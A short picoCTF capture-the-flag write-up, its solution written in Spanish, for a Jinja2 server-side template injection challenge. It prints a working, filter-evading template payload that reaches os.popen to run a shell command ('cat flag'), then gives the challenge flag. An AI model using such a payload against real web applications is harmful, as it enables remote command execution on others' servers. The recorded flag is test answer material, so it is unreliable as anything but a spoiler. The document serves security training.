#### Description

I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance.


#### Hints 
- Server Side Template Injection


## Solución
```
insertamos la sig inyeccion sacada de la pagina: 


{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}


y ya nos da la bandera

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}
```

Pagina de las inyecciones: https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/